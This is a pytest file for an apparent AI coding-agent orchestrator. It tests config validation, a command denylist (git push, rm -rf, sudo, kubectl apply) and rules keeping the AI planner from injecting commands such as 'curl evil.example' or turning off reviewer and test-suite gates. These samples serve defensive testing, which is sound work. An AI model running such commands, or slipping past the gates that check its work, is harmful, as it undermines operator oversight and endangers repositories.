"""Project config: schema, structural validation, the denylist, and the
declarative/executable partition.

The partition is the design's core safety property, so the tests that matter
most here are the ones proving a planner cannot smuggle an executable field
into a stage.
"""

import textwrap

import pytest
from pathlib import Path

from code_gantry.config import (
    PLANNER_WRITABLE_FIELDS,
    ConfigError,
    Stage,
    denylist_violations,
    load_config,
    parse_config,
    validate_stage,
)


def minimal(**overrides):
    base = {
        "target_repo": "/tmp/some-app",
        "base_ref": "main",
        "project_branch": "upgrade/rails-5",
        "plan_root": "docs/plan.md",
        "test_command": "pytest",
        "executor": {"model": "openai/local"},
        "planner": {"model": "claude-opus-5"},
        "reviewer": {"model": "gpt-5.5"},
    }
    base.update(overrides)
    return base


def a_stage(**overrides):
    fields = {"id": "s1", "instruction": "do it", "edit_files": ["app/**"]}
    fields.update(overrides)
    return Stage(**fields)


class TestDefaults:
    def test_minimal_config_parses(self):
        cfg = parse_config(minimal())
        assert cfg.project_branch == "upgrade/rails-5"

    def test_no_stages_list_exists(self):
        # Stages are derived by the planner at runtime.
        assert not hasattr(parse_config(minimal()), "stages")

    def test_unknown_top_level_key_rejected(self):
        with pytest.raises(ConfigError) as e:
            parse_config(minimal(stages=[{"id": "x"}]))
        assert "stages" in str(e.value)

    def test_limits_have_defaults(self):
        limits = parse_config(minimal()).limits
        assert limits.max_test_retries == 3
        assert limits.max_rework_retries == 2
        assert limits.max_planner_interventions == 12
        assert limits.max_stages == 60
        assert limits.wall_clock_hours == 14.0

    def test_planner_provider_defaults_to_anthropic(self):
        cfg = parse_config(minimal())
        assert cfg.planner.provider == "anthropic"
        assert cfg.planner.api_key_env == "ANTHROPIC_API_KEY"

    def test_reviewer_provider_defaults_to_openai(self):
        assert parse_config(minimal()).reviewer.provider == "openai"

    def test_full_suite_on_approval_defaults_on(self):
        assert parse_config(minimal()).full_suite_on_approval is True


class TestBranchTopology:
    def test_project_branch_must_differ_from_base_ref(self):
        with pytest.raises(ConfigError) as e:
            parse_config(minimal(project_branch="main"))
        assert "base_ref" in str(e.value)

    def test_child_branches_sit_beside_the_project_branch_not_under_it(self):
        # Git refs are filesystem paths: refs/heads/upgrade/rails-5 is a file,
        # so refs/heads/upgrade/rails-5/stage-001-x cannot also exist. The
        # namespace has to be a sibling path component.
        cfg = parse_config(minimal())
        assert cfg.stage_branch(1, "extract") == "upgrade/rails-5-stage/001-extract"
        assert not cfg.stage_branch(1, "extract").startswith(
            cfg.project_branch + "/"
        )

    def test_stage_branch_index_is_zero_padded(self):
        # So they sort correctly in `git branch` output.
        cfg = parse_config(minimal())
        assert cfg.stage_branch(7, "x").endswith("/007-x")

    def test_invalid_project_branch_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(project_branch="bad/../ref"))


class TestPlanRoot:
    def test_plan_root_required(self):
        cfg = minimal()
        del cfg["plan_root"]
        with pytest.raises(ConfigError):
            parse_config(cfg)

    def test_directory_plan_root_rejected(self):
        # Pointing at docs/ sweeps every runbook and ADR into every review
        # prompt — a correctness and a cost problem at once.
        with pytest.raises(ConfigError) as e:
            parse_config(minimal(plan_root="docs/"))
        assert "single document" in str(e.value)

    def test_absolute_plan_root_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(plan_root="/etc/passwd"))

    def test_escaping_plan_root_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(plan_root="../../elsewhere/plan.md"))

    def test_plan_root_resolves_against_the_target_repo(self):
        cfg = parse_config(minimal())
        assert str(cfg.plan_root_path) == "/tmp/some-app/docs/plan.md"


class TestScopedTestCommand:
    def test_requires_a_paths_placeholder(self):
        # Without the slot there is nowhere for CodeGantry to inject the
        # stage's changed files, and the "planner supplies arguments, not
        # commands" mechanism silently does nothing.
        with pytest.raises(ConfigError) as e:
            parse_config(minimal(scoped_test_command="rspec"))
        assert "{paths}" in str(e.value)

    def test_accepts_a_placeholder(self):
        cfg = parse_config(minimal(scoped_test_command="rspec {paths}"))
        assert "{paths}" in cfg.scoped_test_command


class TestVerifiability:
    def test_project_with_no_test_command_and_no_checks_rejected(self):
        cfg = minimal()
        del cfg["test_command"]
        with pytest.raises(ConfigError) as e:
            parse_config(cfg)
        assert "verify" in str(e.value)

    def test_checks_in_stage_defaults_suffice(self):
        cfg = minimal(stage_defaults={"checks": ["true"]})
        del cfg["test_command"]
        assert parse_config(cfg).stage_defaults.checks == ["true"]


class TestDenylist:
    """Refused regardless of operator approval."""

    def test_git_push_rejected(self):
        with pytest.raises(ConfigError) as e:
            parse_config(minimal(setup_command="git push origin HEAD"))
        assert "denylist" in str(e.value)

    def test_git_checkout_rejected(self):
        # Changing branches inside a command breaks the stage's branch identity.
        with pytest.raises(ConfigError):
            parse_config(minimal(setup_command="git checkout main && true"))

    def test_git_merge_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(test_command="git merge main"))

    def test_git_reset_rejected(self):
        # Would destroy the baseline the scope guard measures against.
        with pytest.raises(ConfigError):
            parse_config(minimal(setup_command="git reset --hard"))

    def test_deploy_invocations_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(setup_command="kubectl apply -f k8s/"))

    def test_sudo_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(setup_command="sudo docker compose up"))

    def test_recursive_delete_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(setup_command="rm -rf tmp/"))

    def test_gem_install_outside_bundle_rejected(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(setup_command="gem install rails"))

    def test_bundle_install_is_fine(self):
        # The denylist must not fire on legitimate commands, or it gets disabled.
        parse_config(minimal(setup_command="bundle install"))

    def test_ordinary_git_reads_are_fine(self):
        parse_config(minimal(setup_command="git rev-parse HEAD"))

    def test_docker_compose_is_fine(self):
        parse_config(minimal(setup_command="docker compose up -d db"))

    def test_violation_names_the_field_and_the_reason(self):
        problems = denylist_violations([("setup_command", "git push")])
        assert "setup_command" in problems[0]
        assert "outer merge" in problems[0]

    def test_checks_every_executable_field(self):
        # A new executable field not listed in all_commands() would silently
        # stop being covered.
        cfg = parse_config(minimal(scoped_test_command="rspec {paths}"))
        labels = {label for label, _ in cfg.all_commands()}
        assert {"setup_command", "test_command", "scoped_test_command"} <= labels | {
            "setup_command"
        }

    def test_stage_default_commands_are_checked(self):
        with pytest.raises(ConfigError):
            parse_config(minimal(stage_defaults={"checks": ["git push"]}))


class TestPlannerPartition:
    """The planner may write declarative fields and only declarative fields."""

    def test_allowlist_contains_only_declarative_fields(self):
        # Pinned deliberately: adding a field here has to be an edit someone
        # made on purpose, having asked whether it is declarative.
        # `must_not_remain` is — a regex CodeGantry runs over files it
        # already reads, with no command anywhere in it. It is the mirror of
        # `forbidden_patterns`, which was always in the allowlist for the same
        # reason.
        #
        # `read_excerpts` is too, and more plainly than either: a path and two
        # integers. It names lines CodeGantry reads and quotes; there is
        # no string in it that anything executes, and the widest damage a wrong
        # one can do is show the executor the wrong part of a file it was
        # already allowed to read.
        assert PLANNER_WRITABLE_FIELDS == {
            "id",
            "instruction",
            "edit_files",
            "read_files",
            "read_excerpts",
            "constraints",
            "acceptance",
            "forbidden_patterns",
            "must_not_remain",
            "test_paths",
            "require_new_tests",
            # An adjective about the work, and the plainest entry on the list:
            # one of three words, read by nothing that decides anything. It is
            # recorded beside what the stage cost so the planner's estimate can
            # be checked against the outcome.
            "difficulty",
        }

    def test_executable_fields_are_not_writable(self):
        for field in (
            "preconditions",
            "context_commands",
            "setup_command",
            "test_command",
            "checks",
        ):
            assert field not in PLANNER_WRITABLE_FIELDS

    def test_gate_removing_policy_is_not_writable(self):
        # The line is direction, not category. These two switch gates *off* —
        # skip the reviewer, skip the full suite — so a model that talked
        # itself into either would be dismantling the thing that checks it.
        # `require_new_tests` is also policy but only ever adds a gate, and is
        # merged with OR so it cannot waive the operator's, which is why it
        # lives in the allowlist and these do not.
        for field in ("review", "full_suite_on_approval"):
            assert field not in PLANNER_WRITABLE_FIELDS

    def test_planner_output_is_filtered_not_trusted(self):
        # Even if the schema failed upstream, an executable field must not
        # survive into a Stage.
        cfg = parse_config(minimal())
        stage = cfg.stage_from_planner(
            {
                "id": "s1",
                "instruction": "do it",
                "edit_files": ["app/**"],
                "checks": ["curl evil.example"],
                "test_command": "git push",
            }
        )
        assert stage.test_command is None
        assert stage.checks == []

    def test_operator_stage_defaults_are_applied(self):
        cfg = parse_config(
            minimal(
                stage_defaults={
                    "checks": ["bin/route-snapshot"],
                    "preconditions": ["true"],
                    "require_new_tests": True,
                }
            )
        )
        stage = cfg.stage_from_planner(
            {"id": "s1", "instruction": "x", "edit_files": ["a"]}
        )
        assert stage.checks == ["bin/route-snapshot"]
        assert stage.preconditions == ["true"]
        assert stage.require_new_tests is True

    def test_the_planner_may_demand_tests_for_a_stage(self):
        # It could always *permit* a spec by naming it in edit_files. It could
        # not require one, so nothing checked that the executor wrote it.
        #
        # The case that motivated this: a content-type regression shipped past
        # both gates because no spec asserted a response content type. The
        # reviewer approved the diff and the full suite was green, because
        # neither had anything to check against. The planner spotted it several
        # stages later and could describe the fix but not demand coverage for
        # it — so the same class of regression could ship again the same way.
        cfg = parse_config(minimal())
        stage = cfg.stage_from_planner(
            {
                "id": "s1",
                "instruction": "fix the regression",
                "edit_files": ["app/x.rb", "spec/x_spec.rb"],
                "require_new_tests": True,
            }
        )
        assert stage.require_new_tests is True

    def test_the_planner_may_not_waive_the_operator_default(self):
        # It raises the bar, never lowers it. An operator who requires tests on
        # every stage does not get that quietly undone by a model that judged
        # this one exempt.
        cfg = parse_config(minimal(stage_defaults={"require_new_tests": True}))
        stage = cfg.stage_from_planner(
            {
                "id": "s1",
                "instruction": "x",
                "edit_files": ["a"],
                "require_new_tests": False,
            }
        )
        assert stage.require_new_tests is True

    def test_requiring_tests_is_not_a_way_to_run_something(self):
        # The partition holds: this is a boolean policy, and what counts as a
        # test file stays in operator config where the planner cannot reach it.
        cfg = parse_config(minimal())
        stage = cfg.stage_from_planner(
            {
                "id": "s1",
                "instruction": "x",
                "edit_files": ["a"],
                "require_new_tests": True,
                "test_file_patterns": ["**/*"],
            }
        )
        assert stage.require_new_tests is True
        assert cfg.test_file_patterns != ["**/*"]

    def test_declarative_fields_pass_through(self):
        cfg = parse_config(minimal())
        stage = cfg.stage_from_planner(
            {
                "id": "s1",
                "instruction": "do it",
                "edit_files": ["app/**"],
                "read_files": ["config/routes.rb"],
                "constraints": "Rails 4.2 only.",
                "forbidden_patterns": ["optional: true"],
                "test_paths": ["spec/models"],
            }
        )
        assert stage.constraints == "Rails 4.2 only."
        assert stage.forbidden_patterns == ["optional: true"]
        assert stage.test_paths == ["spec/models"]


class TestThePlannerMayNotAuthorCode:
    """The partition, one field further along.

    `PLANNER_WRITABLE_FIELDS` already stops the planner naming anything
    executable. It never stopped it *writing the code* — an instruction reading
    "replace this block with exactly this block" is authored code travelling in
    a declarative field, and the executor handed one can only transcribe it.

    Three costs, all measured on one run of 48 stages. Five of eleven
    rejections conceded the behaviour and rejected the shape, because every
    line of an instruction is a reject criterion. One stage deadlocked because
    an authored edit stops being satisfiable once part of it is already true.
    And a hand-written replacement re-encodes whatever the planner believed:
    one rewrote a whitelist and kept an entry naming something that did not
    exist, in a stage drawn to fix entries of exactly that kind.

    A reference can only point at code that already exists, so `read_excerpts`
    cannot express an after-image. That is what makes this a property of the
    format rather than a matter of compliance.
    """

    def test_a_fenced_block_in_the_instruction_is_a_problem(self):
        cfg = parse_config(minimal())
        stage = a_stage(instruction="Do it:\n\n```ruby\nx = 1\n```\n")
        assert any("read_excerpts" in p for p in validate_stage(stage, cfg))

    def test_the_fence_need_not_name_a_language(self):
        cfg = parse_config(minimal())
        stage = a_stage(instruction="Do it:\n\n```\nx = 1\n```\n")
        assert validate_stage(stage, cfg) != []

    def test_inline_backticks_are_left_alone(self):
        # Naming an identifier is a property, not authored code, and the
        # guidance tells the planner to do it. A rule that caught this would be
        # unusable and would be routed around rather than followed.
        cfg = parse_config(minimal())
        stage = a_stage(
            instruction="`SORTABLE_FIELDS` must name only fields that exist; "
            "see `models/thing` around the declaration."
        )
        assert validate_stage(stage, cfg) == []

    def test_the_message_says_where_the_code_should_go_instead(self):
        # A prohibition with no alternative gets satisfied by deleting the
        # context the executor needed rather than by moving it.
        cfg = parse_config(minimal())
        stage = a_stage(instruction="```\nx = 1\n```")
        problems = validate_stage(stage, cfg)
        assert any("read_excerpts" in p for p in problems)


class TestValidateStage:
    def test_a_good_stage_has_no_problems(self):
        cfg = parse_config(minimal())
        assert validate_stage(a_stage(), cfg) == []

    def test_agent_stage_requires_an_instruction(self):
        cfg = parse_config(minimal())
        problems = validate_stage(a_stage(instruction=None), cfg)
        assert any("instruction" in p for p in problems)

    def test_edit_files_required(self):
        # The scope guard is meaningless without it.
        cfg = parse_config(minimal())
        problems = validate_stage(a_stage(edit_files=[]), cfg)
        assert any("edit_files" in p for p in problems)

    def test_unsafe_stage_id_rejected(self):
        # Stage ids become git refs and directory names.
        cfg = parse_config(minimal())
        problems = validate_stage(a_stage(id="bad/id"), cfg)
        assert any("git ref" in p for p in problems)

    def test_bad_forbidden_pattern_rejected(self):
        cfg = parse_config(minimal())
        problems = validate_stage(a_stage(forbidden_patterns=["unclosed(["]), cfg)
        assert any("regex" in p for p in problems)

    def test_unverifiable_stage_rejected(self):
        cfg = minimal()
        del cfg["test_command"]
        cfg = parse_config({**cfg, "stage_defaults": {"checks": ["true"]}})
        problems = validate_stage(a_stage(checks=[]), cfg)
        assert any("verifies it" in p for p in problems)

    def test_every_command_a_stage_can_run_is_denylisted(self):
        """The check `stage.command` used to carry, now that it is gone.

        A stage's executable fields — `checks`, `preconditions`,
        `context_commands`, `setup_command`, `test_command` — are all populated
        from `stage_defaults`, so every string a stage can run comes from the
        config and is covered by `all_commands()` at load. `stage.command` was
        the one exception, which is why it needed its own pass; deleting it
        without checking would have been a silent hole.
        """
        with pytest.raises(ConfigError) as e:
            parse_config({**minimal(), "stage_defaults": {"checks": ["git push"]}})
        assert any("denylist" in p for p in e.value.problems)


class TestStageResolution:
    def test_stage_test_command_overrides_project(self):
        cfg = parse_config(minimal())
        assert a_stage(test_command="pytest x").effective_test_command(cfg) == "pytest x"

    def test_falls_back_to_the_project_test_command(self):
        cfg = parse_config(minimal())
        assert a_stage().effective_test_command(cfg) == "pytest"

    def test_full_suite_override_is_per_stage(self):
        cfg = parse_config(minimal(full_suite_on_approval=True))
        assert a_stage(full_suite_on_approval=False).full_suite_required(cfg) is False
        assert a_stage().full_suite_required(cfg) is True


class TestEndpointAddressing:
    """`api_base_env` keeps a hostname out of a file that gets committed.

    A hostname is an infrastructure fact, not a project decision, and
    `projects/<slug>/config.yaml` is tracked.
    """

    def test_resolves_from_the_environment(self, monkeypatch):
        monkeypatch.setenv("SPARK_API_BASE", "http://spark.internal:8080/v1")
        cfg = parse_config(
            minimal(executor={"model": "openai/local", "api_base_env": "SPARK_API_BASE"})
        )
        assert cfg.executor.resolve_api_base() == "http://spark.internal:8080/v1"

    def test_a_literal_api_base_still_works(self):
        cfg = parse_config(
            minimal(executor={"model": "openai/local", "api_base": "http://h:1/v1"})
        )
        assert cfg.executor.resolve_api_base() == "http://h:1/v1"

    def test_neither_resolves_to_none(self):
        cfg = parse_config(minimal())
        assert cfg.executor.resolve_api_base() is None

    def test_setting_both_is_a_config_error(self):
        # Ambiguous. Silently preferring one hides the operator's mistake.
        with pytest.raises(ConfigError) as e:
            parse_config(
                minimal(
                    executor={
                        "model": "openai/local",
                        "api_base": "http://literal/v1",
                        "api_base_env": "SPARK_API_BASE",
                    }
                )
            )
        assert "api_base" in str(e.value)

    def test_an_unset_variable_raises_at_use_not_at_load(self, monkeypatch):
        # Loading must keep working with the variable absent, or `status` could
        # not read a report on a machine that never exports it.
        monkeypatch.delenv("SPARK_API_BASE", raising=False)
        cfg = parse_config(
            minimal(executor={"model": "openai/local", "api_base_env": "SPARK_API_BASE"})
        )
        with pytest.raises(KeyError) as e:
            cfg.executor.resolve_api_base()
        assert "SPARK_API_BASE" in str(e.value)

    def test_available_on_every_endpoint(self, monkeypatch):
        # A gateway in front of a paid model is an infrastructure value too.
        monkeypatch.setenv("GW", "https://gateway.internal/v1")
        cfg = parse_config(
            minimal(
                planner={"model": "claude-opus-5", "api_base_env": "GW"},
                reviewer={"model": "gpt-5.5", "api_base_env": "GW"},
            )
        )
        assert cfg.planner.resolve_api_base() == "https://gateway.internal/v1"
        assert cfg.reviewer.resolve_api_base() == "https://gateway.internal/v1"


class TestLoadFromFile:
    def test_loads_yaml(self, tmp_path):
        path = tmp_path / "config.yaml"
        path.write_text(
            textwrap.dedent(
                """
                target_repo: /tmp/some-app
                project_branch: upgrade/rails-5
                plan_root: docs/plan.md
                test_command: pytest
                executor:
                  model: openai/local
                planner:
                  model: claude-opus-5
                reviewer:
                  model: gpt-5.5
                """
            )
        )
        assert load_config(path).plan_root == "docs/plan.md"

    def test_missing_file_is_a_config_error(self, tmp_path):
        with pytest.raises(ConfigError):
            load_config(tmp_path / "absent.yaml")

    def test_malformed_yaml_is_a_config_error(self, tmp_path):
        path = tmp_path / "config.yaml"
        path.write_text("executor: [unclosed")
        with pytest.raises(ConfigError):
            load_config(path)


class TestAStageMustBePossible:
    """A stage that cannot pass by construction wastes a whole attempt cycle.

    `require_new_tests` fails the stage unless its diff touches a test file.
    The scope guard fails it if the diff touches anything outside `edit_files`.
    Demand a test and forbid writing one and the executor cannot satisfy both:
    it writes the spec, scope rejects it, and the loop spends a retry — or two,
    then an intervention — discovering something checkable before it started.

    Same shape as the contradiction that blocked a stage on the first long run:
    an instruction demanding exactly three edits *and* zero remaining matches,
    in a file with five.
    """

    def _stage(self, cfg, **over):
        fields = {
            "id": "add-coverage",
            "instruction": "add a spec",
            "edit_files": ["app/thing.rb"],
            "require_new_tests": True,
        }
        fields.update(over)
        return cfg.stage_from_planner(fields)

    def test_requiring_tests_without_room_to_write_them_is_rejected(self):
        cfg = parse_config(minimal(test_file_patterns=["spec/**/*_spec.rb"]))
        problems = validate_stage(self._stage(cfg), cfg)
        assert any("require_new_tests" in p for p in problems)

    def test_naming_a_spec_in_edit_files_satisfies_it(self):
        cfg = parse_config(minimal(test_file_patterns=["spec/**/*_spec.rb"]))
        stage = self._stage(cfg, edit_files=["app/thing.rb", "spec/thing_spec.rb"])
        assert not [p for p in validate_stage(stage, cfg) if "require_new_tests" in p]

    def test_a_glob_covering_specs_satisfies_it(self):
        # `spec/**` is how a planner usually says it.
        cfg = parse_config(minimal(test_file_patterns=["spec/**/*_spec.rb"]))
        stage = self._stage(cfg, edit_files=["app/thing.rb", "spec/**"])
        assert not [p for p in validate_stage(stage, cfg) if "require_new_tests" in p]

    def test_a_stage_not_requiring_tests_is_unaffected(self):
        cfg = parse_config(minimal(test_file_patterns=["spec/**/*_spec.rb"]))
        stage = self._stage(cfg, require_new_tests=False)
        assert not [p for p in validate_stage(stage, cfg) if "require_new_tests" in p]


class TestAgentContextDocuments:
    """Conventions the repository already documents for whoever works in it.

    A project that has agents working in it usually keeps a file telling them
    how it works — how to run the suite, what the container does, which
    conventions bite. That file is maintained because humans and interactive
    sessions read it. The planner could not, so the same facts had to be
    hand-copied into `planner.guidance`, and a hand copy drifts: on one project
    `AGENTS.md` recorded that editing the Gemfile reinstalls the bundle
    automatically, the guidance said nothing, and the plan asserted the
    opposite for five stages' worth of work nobody drew.

    Unset means the conventional names, because a project that has one has
    almost always called it one of these. An explicit empty list means the
    operator decided there is none — which is not the same thing.
    """

    def _cfg(self, **over):
        data = {
            "target_repo": "/tmp/x",
            "project_branch": "work",
            "plan_root": "PLAN.md",
            "test_command": "pytest",
            "executor": {"model": "m"},
            "planner": {"model": "claude-opus-5"},
            "reviewer": {"model": "gpt-5.6"},
        }
        data.update(over)
        return parse_config(data)

    def test_unset_defaults_to_the_conventional_names(self):
        assert self._cfg().effective_agent_context == ["AGENTS.md", "CLAUDE.md"]

    def test_an_explicit_list_replaces_the_default(self):
        cfg = self._cfg(agent_context=["docs/conventions.md"])
        assert cfg.effective_agent_context == ["docs/conventions.md"]

    def test_an_explicit_empty_list_means_none(self):
        # Distinct from unset: the operator looked and decided there is none.
        assert self._cfg(agent_context=[]).effective_agent_context == []


class TestThePlannerOutputBudgetIsASetting:
    """`_call_failure` tells the operator to raise it. It could not be raised.

    A truncated structured response arrives as a pydantic dump — the SDK parses
    before returning, so a verdict cut mid-JSON raises inside the call — and
    `_call_failure` translates that into the one useful instruction: "the
    output budget is too small for the stage instruction it was writing — raise
    the planner's max_tokens rather than retrying". The value was hardcoded, so
    an operator following that advice had nowhere to go.

    It also has to move for step 10. Five stage specs at the measured p90
    instruction length is ~12,200 tokens of output before any reasoning, and
    thinking comes out of the same budget.
    """

    def _cfg(self, **planner):
        from code_gantry.config import parse_config

        base = {"model": "claude-opus-5"}
        base.update(planner)
        return parse_config({
            "target_repo": ".", "base_ref": "main", "project_branch": "p",
            "plan_root": "PLAN.md", "test_command": "true",
            "executor": {"model": "m"}, "planner": base,
            "reviewer": {"model": "gpt-5.6-sol"},
        })

    def test_the_default_is_generous_because_it_is_a_ceiling(self):
        # Was 32,000, which was the hardcoded value this setting replaced. A
        # batched derivation died mid-JSON against it — five instructions plus
        # reasoning at `xhigh` against a budget sized for one — so it is 64,000
        # now, measured as half what the API accepts for this model.
        assert self._cfg().planner.max_tokens == 64_000

    def test_an_operator_can_change_it(self):
        assert self._cfg(max_tokens=100_000).planner.max_tokens == 100_000

    def test_the_client_sends_the_configured_value(self):
        """Pinned at the call, not at the config.

        A setting that is declared and never passed is the same as no setting,
        and this codebase has shipped that shape before — a field read by
        nothing, and a guard that never fired.
        """
        from code_gantry.planner import AnthropicPlanner

        sent = {}

        class Client:
            class messages:
                @staticmethod
                def parse(**kwargs):
                    sent.update(kwargs)
                    raise RuntimeError("stop here")

        p = AnthropicPlanner(self._cfg(max_tokens=51_000).planner, client=Client())
        p.plan([{"role": "user", "content": "x"}])
        assert sent["max_tokens"] == 51_000
